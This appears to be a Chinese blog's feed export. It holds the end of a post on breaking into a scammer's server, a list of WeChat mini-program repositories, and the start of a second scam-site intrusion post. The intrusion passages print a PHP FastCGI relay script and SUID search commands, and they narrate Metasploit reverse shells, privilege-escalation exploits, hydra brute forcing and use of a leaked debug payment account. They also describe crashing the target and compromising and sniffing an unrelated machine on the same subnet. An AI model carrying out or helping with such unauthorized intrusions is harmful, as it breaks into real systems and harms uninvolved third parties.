class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果是监听本地 <code>9000</code> 端口，可以使用 <code>fsockopen</code> 协议来发送 fastcgi 协议数据，具体就是：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"On"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">9000</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: <span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)&lt;br />\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后打开 <code>msfconsole</code> 开启反向连接监听：</p><p><img src="https://img-blog.csdnimg.cn/290fa18c63d24ee2bcabc4a7a1ac83a0.png" alt="msf-listen-reverse-tcp"></p><p>然后本地用浏览器访问一下服务器中的发送 fastcgi 的 php 程序，并凭借上要发送的数据：</p><p><img src="https://img-blog.csdnimg.cn/eeb5e14d4c33489597a8da4d03ca7725.png" alt="front-msf-reverse-link"></p><p>正常情况页面会持续加载中，然后 msf 这边就会收到连接请求并进入 <code>meterpreter shell</code>，然后看一下系统信息，nice，直接进入 <code>shell</code> 进行下一步操作：</p><p><img src="https://img-blog.csdnimg.cn/9c15cb50123d4937ae6885d0fa918403.png" alt="msf-meter-sysinfo"></p><p>因为之前说这里的 php 建立的连接只有不到一分钟时间，<code>.so</code> 文件执行的指令也不例外，所以这里就到了<strong>争分夺秒</strong>考验手速的时刻了，先断开连接待会重来，然后这次需要准备第二个 <code>payload</code> 传到同目录下，为了节省时间可以在第一次连接前以后台任务运行（<code>run -j</code>）<code>meterpreter</code> 反向监听，这样就不会浪费时间再去切换 <code>module</code> 和设置 <code>payload</code> 再运行了：</p><p><img src="https://img-blog.csdnimg.cn/19a345aab60d4ab29da66cc7bc33ebaf.png" alt="msf-run-meter-job"></p><p>在网页请求后建立第一个 <code>payload</code> 连接，然后迅速进入 <code>shell</code> 执行一个 <code>nohup</code> 后台任务来运行刚才上传的第二个 <code>payload</code>：</p><p><img src="https://img-blog.csdnimg.cn/20f6d91c48114731b4de924525a13804.png" alt="msf-link-payload-2"></p><p>不出意外第二个 <code>payload</code> 的监听任务就会建立连接，并且是持续的<strong>长连接</strong>，第一个连接关掉也无所谓，后面就能愉快地进行其他操作了 (ง •_•)ง</p><h2 id="Linux-提权（Privilege-Escalation）"><a href="#Linux-提权（Privilege-Escalation）" class="headerlink" title="Linux 提权（Privilege Escalation）"></a>Linux 提权（Privilege Escalation）</h2><p>前面虽然已花了不少时间，但还没到达最关键的一步，现在才是重头戏，并且也不会太轻松，毕竟这是 Linux 系统，不同于 windows，版本和补丁数量不是特别高的话，提权漏洞一抓一把（这方面也稍微印证了 Linux 系统较于 Windows 更安全），少归少，不至于没有，只能逐个尝试；</p><h3 id="Sudo-Baron-Samedit（cve-2021-3156）"><a href="#Sudo-Baron-Samedit（cve-2021-3156）" class="headerlink" title="Sudo Baron Samedit（cve-2021-3156）"></a>Sudo Baron Samedit（cve-2021-3156）</h3><p>记得今年（2021）年初正好报了一个 Linux sudo 程序的提权漏洞，正好试下：</p><p><img src="https://img-blog.csdnimg.cn/e5f89792f7e344d0a177ba6185a3d32a.png" alt="msf-shell-check-baron-samedit"></p><p>感觉有戏，下个 <code>exp</code> 上传手动跑下试试：</p><p><img src="https://img-blog.csdnimg.cn/e685becd7d7946e68209c9b155a176db.png" alt="msf-shell-exploit-baron-samedit"></p><p>最后似乎不行，再用 <code>msf exploit</code> 试试：</p><p><img src="https://img-blog.csdnimg.cn/3df41d17590140b496ca26127dac4783.png" alt="msf-run-baron-samedit"></p><p>等了十几分钟，最后依然失败，这条路应该是行不通了；</p><h3 id="Local-Exploit-Suggester"><a href="#Local-Exploit-Suggester" class="headerlink" title="Local Exploit Suggester"></a>Local Exploit Suggester</h3><p>这里使用一下这款本地提权建议工具，它会自动获取相关系统信息并提供一些可利用的漏洞建议：</p><p><img src="https://img-blog.csdnimg.cn/a51c29502ea646578184098fef21a25c.png" alt="msf-local-exploit-suggester"></p><p>可以看到列举出了不少存在可能性的 <code>exp</code>，再去挨个尝试下，结果，也全部无效，心又凉了小半截；</p><h3 id="Suid-提权"><a href="#Suid-提权" class="headerlink" title="Suid 提权"></a>Suid 提权</h3><p>简单说 <code>suid</code> 是一种权限，它运行具有该权限的文件执行时，能以该文件所有者的权限执行，例如具有所有用户读写执行的文件权限是 <code>rwxrwxrwx</code>，那么它再具有 <code>suid</code> 权限就会是 <code>rwsrwxrwx</code> （第三位是 <code>s</code>），权限码就是 <code>4777</code>，这里可利用的地方就是，假如某个文件所有者是 <code>root</code> 账户，并且其他用户可执行，那么其他用户在执行时，就间接有了 root 权限；</p><p>例如利用 <code>find</code> 提权执行 <code>whoami</code> 就是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> some-file <span class="token parameter variable">-exec</span> <span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以先查找一下全系统就有该权限特征的文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/9e6f005b40984dbbbe154b254a8b6709.png" alt="msf-shell-find-suid"></p><p>虽然有不少但是没有找到可利用的，常见的可利用程序和利用参数大致有（执行高权限的文件或查看高权限文件内容）：</p><pre class="line-numbers language-none"><code class="language-none">findcpnmapvimvibashmorelessnanoziptarmvmanchmodashawkpythonperltcpdumpdatetimecpulimit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="crontab-任务"><a href="#crontab-任务" class="headerlink" title="crontab 任务"></a>crontab 任务</h3><p>利用定时任务（<code>cron</code>）漏洞也是一种思路，假如存在会被定时执行的脚本文件，并且该文件又可写，就可以让其到达时间后执行任意命令；不过检查了一遍，都没有找到可利用的文件；</p><p><img src="https://img-blog.csdnimg.cn/56b9346f8207473ba036a7b00d164656.png" alt="ant-file-cron-jobs"></p><h3 id="宝塔-CSRF"><a href="#宝塔-CSRF" class="headerlink" title="宝塔 CSRF"></a>宝塔 CSRF</h3><p>在一度没辙的时候，把方向转向了之前备份下载的站点源码，分析的时候发现有个日志输出目录，看着输出日志信息都比较详细，就尝试着全局搜一下请求数据之类的，看有没有账户密码或 <code>cookies</code> 数据，结果就找到了几处宝塔相关的登录凭证：</p><p><img src="https://img-blog.csdnimg.cn/53fc25e72b28486580a00caf28ee67b9.png" alt="code-runtime-log-bt-token"></p><p>但这些凭证的时间都很靠前，应该都失效了，而且在用自己的宝塔服务测试时发现，出了会话 <code>cookie</code> 时效为 2 小时外，软件似乎也对 <code>csrf</code> 这类漏洞做了限制，比如某个账户在一台电脑登录后，直接拿到浏览器存储的 <code>cookie</code> 信息然后放到另一台电脑中去伪造访问，不仅伪造的机子无法登录，原登录的机子也会自动<strong>退出登录</strong>；不过在分析时发现了另外一处 <code>cookie</code> 信息，里面似乎包含了宝塔面板的一些信息：</p><p><img src="https://img-blog.csdnimg.cn/e7a7d865e43c404082a8d9ace3352aa4.png" alt="code-bt-cookies"></p><p>拿去解码分析下，发现有个隐藏四位的手机号，应该是面板的登录账户名，先留着也许后面有用：</p><p><img src="https://img-blog.csdnimg.cn/9feb1e36d6154e8e91319980b52bb4b0.png" alt="front-urldecode-bt-info"></p><h3 id="mysql-提权"><a href="#mysql-提权" class="headerlink" title="mysql 提权"></a>mysql 提权</h3><p>目前来看这条路希望不大，前面提到不同站点使用不同的 mysql 子账户，且分配的权限较低，连 <code>dumpfile</code> 这样的指令也执行不了，更不用说 <code>UDF</code> 这类提权操作了，也对 <code>root</code> 账户进行过密码爆破，都没有收获；想起之前不是拿到一个宝塔的手机号嘛，说不准会用手机作为账户密码，虽然隐藏四位，但无关紧要，总共才一万种可能，直接拿 <strong><code>crunch</code></strong> 生成一个字典然后拿去 <code>hydra</code> 跑一下 root 密码：</p><p><img src="https://img-blog.csdnimg.cn/b57734b509d64a7b98dbe15aca1a13ee.png" alt="cmd-hydra-pma-phone"></p><p>虽然跑完也没花多少时间，但结果证明一个也不是，猜想失败；</p><h3 id="Dirty-Cow"><a href="#Dirty-Cow" class="headerlink" title="Dirty Cow"></a>Dirty Cow</h3><p>后续没更多思路时，查了会资料，准备再试下经典的 <code>Dirty Cow</code> 提权漏洞：</p><p><img src="https://img-blog.csdnimg.cn/7dab9b307782428a89b6de1256d7a7f9.png" alt="msf-priv-dirty-cow"></p><p>然后尴尬的事就发生了，执行了一段时间 <code>exp</code> 后，服务器就突然报错断开了，然后 IP 就一直超时再也连不上了，这个 <code>Kernel panic</code> ，也就是 Linux 系统的<strong>致命错误</strong>，如果没记错的话无限近似于 Windows 系统中断或蓝屏（难道不经意间让 <code>exp</code> 升级为 <code>DOS</code> 了……），当然也可能是运气不好对方又关站跑路了，那么就先这样吧，指不定后面谁又接盘了 (T_T)；</p><h3 id="C段嗅探"><a href="#C段嗅探" class="headerlink" title="C段嗅探"></a>C段嗅探</h3><p>鉴于这次攻克过于棘手，所以过程中曾对机器的所在网段进行过扫描，然后不小心拿下一台业务类似的，和这次的目标在同一网关管辖下，所以先后台嗅探着数据吧，后面有时间再看看收获；</p><p><img src="https://img-blog.csdnimg.cn/64cc706ae7a8463e95a183a4b02132a7.png" alt="msf-shell-c-sniff"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>惯例的总结时间，这个就没说啥的了，如果是诈骗是被动诱捕，那么这个就是主动投敌了，不要过分相信别人私下写的代码再呈现给你看的东西，即使它看起来是那样的真实，你所看到的只不过是对方想让你看到的罢了，对方既是规则的执行者也是制定者以及违背者。</p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit hack 渗透 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序</title>
      <link href="/2024/09/27/qi-ta/xiao-cheng-xu-dai-ma/"/>
      <url>/2024/09/27/qi-ta/xiao-cheng-xu-dai-ma/</url>
      
        <content type="html"><![CDATA[<h2 id="史上最全的微信小程序代码大全"><a href="#史上最全的微信小程序代码大全" class="headerlink" title="史上最全的微信小程序代码大全"></a>史上最全的微信小程序代码大全</h2><ul><li>  ​<a href="https://github.com/Hao-Wu/WeApp-Demo">​微信小程序官方Demo(Hao-Wu/WeApp-Demo)​</a>​</li><li>  ​<a href="https://github.com/phodal/weapp-quick">​微信小应用示例代码(phodal/weapp-quick)​</a>​</li><li>  ​<a href="https://github.com/giscafer/wechat-weapp-mapdemo">​微信小应用地图定位demo(giscafer/wechat-weapp-mapdemo)​</a>​</li><li>  ​<a href="https://github.com/hilongjw/weapp-gold">​微信小应用- 掘金主页信息流(hilongjw/weapp-gold)​</a>​</li><li>  ​<a href="https://github.com/zce/weapp-demo">​微信小程序（应用号）示例：微信小程序豆瓣电影(zce/weapp-demo)​</a>​</li><li>  ​<a href="https://github.com/hingsir/weapp-douban-film">​微信小程序-豆瓣电影(hingsir/weapp-douban-film)​</a>​</li><li>  ​<a href="https://github.com/kunkun12/weapp">​小程序 hello world 尝鲜(kunkun12/weapp)​</a>​</li><li>  ​<a href="https://github.com/natee/wxapp-2048">​微信小程序版2048小游戏(natee/wxapp-2048)​</a>​</li><li>  ​<a href="https://github.com/wangmingjob/weapp-weipiao">​微信小程序-微票(wangmingjob/weapp-weipiao)​</a>​</li><li>  ​<a href="https://github.com/SeptemberMaples/wechat-weapp-demo">​微信小程序购物车DEMO(SeptemberMaples/wechat-weapp-demo)​</a>​</li><li>  ​<a href="https://github.com/jectychen/wechat-v2ex">​微信小程序V2EX(jectychen/wechat-v2ex)​</a>​</li><li>  ​<a href="https://github.com/myronliu347/wechat-app-zhihudaily">​微信小程序-知乎日报(myronliu347/wechat-app-zhihudaily)​</a>​</li><li>  ​<a href="https://github.com/hijiangtao/weapp-newsapp">​微信小程序-公众号热门文章信息流(hijiangtao/weapp-newsapp)​</a>​</li><li>  ​<a href="https://github.com/lypeer/wechat-weapp-gank">​微信小程序版Gank客户端(lypeer/wechat-weapp-gank)​</a>​</li><li>  ​<a href="https://github.com/charleyw/wechat-weapp-redux-todos">​微信小程序集成Redux实现的Todo list(charleyw/wechat-weapp-redux-todos)​</a>​</li><li>  ​<a href="https://github.com/leancloud/leantodo-weapp">​微信小程序集成 LeanCloud 实现的 Todo list(leancloud/leantodo-weapp)​</a>​</li><li>  ​<a href="https://github.com/kraaas/timer">​微信小程序-番茄时钟(kraaas/timer)​</a>​</li><li>  ​<a href="http://javascript.ctolib.com/categories/javascript-wechat-weapp.html">​微信小程序项目汇总​</a>​</li><li>  ​<a href="https://github.com/ericzyh/wechat-chat">​微信小程序版聊天室(ericzyh/wechat-chat)​</a>​</li><li>  ​<a href="https://github.com/BelinChung/wxapp-hiapp">​微信小程序-HiApp(BelinChung/wxapp-hiapp)​</a>​</li><li>  ​<a href="https://github.com/charleyw/wechat-weapp-redux">​小程序Redux绑定库(charleyw/wechat-weapp-redux)​</a>​</li><li>  ​<a href="https://github.com/18380435477/WeApp">​微信小程序版微信(18380435477/WeApp)​</a>​</li><li>  ​<a href="https://github.com/hardog/wechat-app-flexlayout">​小程序开发从布局开始(hardog/wechat-app-flexlayout)​</a>​</li><li>  ​<a href="https://github.com/eyasliu/wechat-app-music">​微信小程序-音乐播放器(eyasliu/wechat-app-music)​</a>​</li><li>  ​<a href="https://github.com/dunizb/wxapp-sCalc">​微信小程序-简易计算器-适合入门（dunizb/wxapp-sCalc）​</a>​</li><li>  ​<a href="https://github.com/zhengxiaowai/weapp-github">​微信小程序-github(zhengxiaowai/weapp-github)​</a>​</li><li>  ​<a href="https://github.com/harveyqing/BearDiary">​微信小程序-小熊の日记(harveyqing/BearDiary)​</a>​</li><li>  ​<a href="https://github.com/SeaHub/PigRaising">​微信小程序(Seahub/PigRaising)​</a>​</li><li>  ​<a href="https://github.com/brucevanfdm/WeChatMeiZhi">​微信小程序(WeChatMeiZhi妹子图)​</a>​</li><li>  ​<a href="https://github.com/zce/weapp-boilerplate">​微信小程序快速开发骨架​</a>​</li><li>  ​<a href="https://github.com/SuperKieran/weapp-artand">​微信小程序 - Artand 最专业的艺术设计平台​</a>​</li><li>  ​<a href="https://github.com/zhijieeeeee/wechat-app-joke">​微信小程序 - 开心一刻(zhijieeeeee/wechat-app-joke)​</a>​</li><li>  ​<a href="https://github.com/uniquexiaobai/wechat-app-githubfeed">​微信小程序 - GitHubFeed(uniquexiaobai/wechat-app-githubfeed)​</a>​</li><li>  ​<a href="https://github.com/fluency03/weapp-500px">​微信小程序 - 国外摄影社区500px(fluency03/weapp-500px)​</a>​</li><li>  ​<a href="https://github.com/bayetech/wechat_mall_applet">​微信小程序 - 巴爷供销社－电商平台(bayetech)​</a>​</li><li>  ​<a href="https://github.com/liujians/Wa-UI">​基于微信小程序的UI库（Wa-UI）​</a>​</li><li>  ​<a href="https://github.com/litt1e-p/weapp-girls">​微信小程序-豆瓣美女/妹子图(weapp-girls)​</a>​</li><li>  ​<a href="https://github.com/liumulin614/BeautifulGirl">​微信小程序-美女模特(BeautifulGirl)​</a>​</li><li>  ​<a href="https://github.com/RebeccaHanjw/weapp-wechat-zhihu">​微信小程序 - 知乎仿写(RebeccaHanjw/weapp-wechat-zhihu)​</a>​</li><li>  ​<a href="https://github.com/romoo/weapp-demo-breadtrip">​微信小程序 - 面包旅行(romoo/weapp-demo-breadtrip)​</a>​</li><li>  ​<a href="https://github.com/luuman/weapp-film">​微信小程序-淘票票(weapp-film)​</a>​</li><li>  ​<a href="https://github.com/ahonn/weapp-one">​微信小程序-仿ONE(ahonn/weapp-one)​</a>​</li><li>  ​<a href="https://github.com/vace/wechatapp-news-reader">​微信小程序-新闻阅读器(vace/wechatapp-news-reader)​</a>​</li><li>  ​<a href="https://github.com/Symous/WechatApp-BaisiSister">​微信小程序 - 百思不得姐(Symous/WechatApp-BaisiSister)​</a>​</li><li>  ​<a href="https://github.com/lanshan-studio/wecqupt">​微信小程序 - We重邮(lanshan-studio/wecqupt)​</a>​</li><li>  ​<a href="https://github.com/DengKe1994/weapp-calculator/tree/master">​微信小程序 - IOS计算器​</a>​</li><li>  ​<a href="https://github.com/monkindey/wx-github">​微信小程序 - github简历(monkindey/wx-github)​</a>​</li><li>  ​<a href="https://github.com/xujinyang/CoderCalendar-WeApp">​微信小程序-程序员老黄历(xujinyang/CoderCalendar-WeApp)​</a>​</li><li>  ​<a href="https://github.com/zce/weapp-todos">​微信小程序 - TODOS（任务清单）(zce/weapp-todos)​</a>​</li><li>  ​<a href="https://github.com/yaoshanliang/weapp-ssha">​微信小程序 - 企业宣传小程序(yaoshanliang/weapp-ssha)​</a>​</li></ul>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次拿下网络诈骗者站点的全过程与套路分析</title>
      <link href="/2024/09/27/qi-ta/ji-yi-ci-na-xia-wang-luo-zha-pian-zhe-zhan-dian-quan-guo-cheng-yu-tao-lu-fen-xi/"/>
      <url>/2024/09/27/qi-ta/ji-yi-ci-na-xia-wang-luo-zha-pian-zhe-zhan-dian-quan-guo-cheng-yu-tao-lu-fen-xi/</url>
      
        <content type="html"><![CDATA[<p>这是一则漫长又跌宕起伏的故事，小伙伴们请随意就坐，自备茶点；全文包含信息收集与攻克的详细全过程，以及对该类型诈骗思路的分析拆解，以提高防范意识；</p><h2 id="0x00-梦的开始"><a href="#0x00-梦的开始" class="headerlink" title="0x00 梦的开始"></a>0x00 梦的开始</h2><p>那是一个阳光明媚的晌午，日常的搬砖过程中收到一封公司邮件，</p><p><img src="https://img-blog.csdnimg.cn/img_convert/71ef1a39064df09076dfb2039dab7c63.png" alt="email-send"></p><p>看到这熟悉的措辞，又瞄了一眼下面的附件内容，熟悉的气息扑面而来，就顺手保存了下来；</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f3d15b9401c60d4bb0e4bc58c223c6ff.png" alt="email-qrcode"></p><p>随即管理员立马发现了不对劲，追发邮件说员工账号被盗用，不要轻信邮件内容，原始邮件也被标为垃圾邮件（上次的类似邮件删的太突然，事情还没开始就结束了，这次总跑不掉了(￣_,￣ )，作为当代好青年，五星好市民，是时候发扬一下活雷锋精神了）；</p><p>而这张图片，就成了一切梦开始的地方……</p><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="0x001-审查域名"><a href="#0x001-审查域名" class="headerlink" title="0x001 审查域名"></a>0x001 审查域名</h3><p>起始信息非常有限，开局一张图，剧情全靠猜，不过这个入口也足够了，先拿出家伙解析下二维码中的信息：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a48005f1308b8590774aa750a9f60ffc.png" alt="email-qrcode-analyze-url"></p><p>没有额外的数据，只有一串网页链接，看着这域名名称，嘴角微微上扬；先去解析一下域名：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7e256cf3a4cf67d50e6daf3616ace4de.png" alt="cmd-nslookup"></p><p>到写文为止已经不能解析该域名了，整顿的倒挺快，不过好在之前有解析备份，域名万变不离其 <code>IP</code>，并且也没有发现使用 CDN，流量全部通往源站；顺手查了一下，是香港的服务器：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/00b8305df79fb2d06497318f55c60d66.png" alt="front-query-ip"></p><p>然后 <code>whois</code> 一下，搜集相关信息：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/45c898ccbe31a5576147a8e2807cbf93.png" alt="cmd-whois"></p><p>不出意外，又是用的三方注册机构，没有额外的有用信息，不过这个注册时间挺有意思，本月的，骗子同志动作还蛮快的；接下来只能去对方网站瞅瞅；</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0f46652c6df7f5330072ecd7b6eb2fd2.png" alt="front-west-whois"></p><p>又是西部数码，看来有些备受青睐，网站提供隐私保护机制，注册信息不对外公开，暂时也获取不到有用信息；</p><h3 id="0x002-审查-IP"><a href="#0x002-审查-IP" class="headerlink" title="0x002 审查 IP"></a>0x002 审查 IP</h3><p>现在唯一的线索就是之前解析的那个 IP 了，一步一步来，先 <code>nmap</code> 扫一波端口服务先，收集更多信息：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/21c78c8aefe7eac62b36770eedce6c93.png" alt="cmd-nmap-port-services"></p><p>嗯还行，看见了几个熟悉的身影，继续走流程，分别跑下默认脚本分析下端口服务信息：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/19e1e18d0589f60ae2fcdf4f951d8615.png" alt="cmd-nmap-default-script"></p><p>没有探测倒匿名 ftp，http 支持 <code>TRACE</code>，没有设 <code>httponly</code>，有执行 <code>XSS</code> 的机会，小本本先记下；然后老规矩，默认字典定向爆破一轮先，尝试还是要有的，万一那啥了呢：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/85ca6acf989cc451b6f4501ae1f51286.png" alt="cmd-nmap-ftp-brute"></p><p>剩余端口也都试了，意料之中，没啥收获，看来基本的密码强度意识还是有的；另外之前的扫描扫描中有出现 <code>8888</code> 这个端口，记得这个是服务器管理工具<strong>宝塔</strong>面板的默认后台入口，访问一下试试：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/79840be48aacfe2034493217f4e1c312.png" alt="front-baota-login-pre"></p><p>有入口校验，起码证明确实是用的宝塔面板，不过这个爆破应该是不可能去爆破的，记得入口 url 后缀默认大概是 8 位任意大小写字母与数字的组合，就是 62 的 8 次方，大约两百万亿，就挺秃然的，先放在后面再说吧，接下来，继续转战其他方向；</p><h3 id="0x003-审查页面"><a href="#0x003-审查页面" class="headerlink" title="0x003 审查页面"></a>0x003 审查页面</h3><p>来都来了，既然扫码是跳转页面链接，并且端口也开放了 80 和 443，当然要打开网页访问一下康康，同时开启开发者工具，看看有啥小动作：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8d34f834094fee08da471a28cde281cb.png" alt="front-home-mobile"></p><p>哎呀，还识别机型，这靶向用户还挺明确，那就切成移动端看看：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1aa108c398c5664b907bbfc9e929d3fe.png" alt="front-home-index"></p><p>emm……怎么说呢，有那味儿了，咋一看还真看不出来，模仿的还挺全（不过胆也确实大，政府网站都搞），然后看了下接口返回的头信息，发现使用的 <code>Windows IIS 7.5 + ASP.NET</code> 的服务：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/90bade1cc1b1400eca7a560a777e6d36.png" alt="front-home-headers"></p><p>这个先记着，后面漏洞挖掘用得着，后面试了一圈发现页面都是空壳，只有那个办理入口的弹窗能跳转，跳转页面是：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/664aa5ee850248f5a35f177b8b64ddea.png" alt="front-apply-btn"></p><p>描述的还挺全，好让大家都能对号入座，这里点下立即申请：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5a596a0603ab532f0140077f99a55cde.png" alt="front-input-name-id"></p><p>然后就开始了个人信息收集的一条龙服务，先是姓名和身份证号，另外，注意看旁边显示加载的 PNG 头图的名称，额难道这是开发者的疯狂暗示？？这里随便输入条信息进去看看：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9b26e444dcfd0d0a9365c9a15d423156.png" alt="front-input-name-error"></p><p>居然还有校验，打个断点看看源码逻辑：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/86d78b88d8b87161b5a21ebd3f48b9bc.png" alt="front-input-name-breakpoint"></p><p>一个号码校验都整的这么齐全，还真是费心了，不过前端的校验都是纸老虎，这里也不用什么偏方了，直接用开发者工具的源码编辑覆盖功能，直接给校验函数返回 <code>true</code>：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/87da6c0882cdf0db65dfb3059f129ca2.png" alt="front-input-name-override"></p><p>然后校验通过，进入下一个步骤：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ebc52d6564f8dd670f91ea30a9af82ad.png" alt="front-input-bank"></p><p>这里是要收集银行卡号和密码以及绑定的手机号，唉，意图很明显，哪有打款转账还要对方密码的操作，这里也准备随便填下，银行卡校验用同样的方法绕过一下，不过在其中一个加载的脚本文件中发现了有意思的东西：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2e40af17b56dee1b83056d427bf7ce6a.png" alt="front-input-bank-js-source"></p><p>开发者连源码中的调试数据都不删除，调的阿里支付的接口，正好借对方调试账号用一下下（再次证明了作为开发者，生产环境中代码移除注释的重要性=_=）：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/35d83f3268cbcc4ba028f84587664e85.png" alt="front-input-bank-amount"></p><p>然后进入了下一个页面，再次收集姓名和证件号，以及银行卡余额（这里应该是对用户真实情况进行摸底以及其他未知操作），下意识查了自己的余额，唉果然这里连撒谎的勇气都没有 T_T，马上填完进入下一步吧：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5760660b9d9d6e9477bea082c7801cc8.png" alt="front-input-bank-amount-value"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d2f0375b558b747059b6f127c367185d.png" alt="front-submit-loading"></p><p>然后页面会一直加载不断刷新，再无其他跳转，应该是给诈骗者提供操作的时间，那么网页的相关操作就暂时告一段落，大致了解了一些操作步骤，接下来探索一下其他方向；</p><h2 id="0x02-漏洞挖掘"><a href="#0x02-漏洞挖掘" class="headerlink" title="0x02 漏洞挖掘"></a>0x02 漏洞挖掘</h2><h3 id="0x001-SQL-注入"><a href="#0x001-SQL-注入" class="headerlink" title="0x001 SQL 注入"></a>0x001 SQL 注入</h3><p>信息收集差不多了，现在来逐个击破，先从最熟悉的网页端入手，前面审查页面时有不少提交表单和输入框，这些都是潜在的攻破点；挖掘技术哪家强，先祭出神器 